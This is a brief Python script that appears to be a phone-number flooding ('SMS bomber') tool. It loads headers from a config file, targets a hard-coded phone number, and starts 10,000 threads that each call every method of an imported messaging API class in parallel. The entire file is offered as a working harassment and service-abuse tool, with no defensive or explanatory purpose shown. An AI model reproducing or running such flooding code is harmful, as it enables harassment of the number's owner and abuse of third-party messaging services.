from threading import Thread
from module import messageAPI
from json import load


def start_flood(class_):
    for functions in [func for func in dir(messageAPI) if callable(getattr(messageAPI, func)) and not func.startswith("__")]:
        Thread(target=getattr(class_, functions)).start()


if (__name__ == '__main__'):
    configs = load(open('./config.json', encoding='utf-8'))

    headers = configs.get('headers')
    message = messageAPI(headers, '0659607720')

    for _ in range(10000):
        Thread(target=start_flood, args=(message,)).start()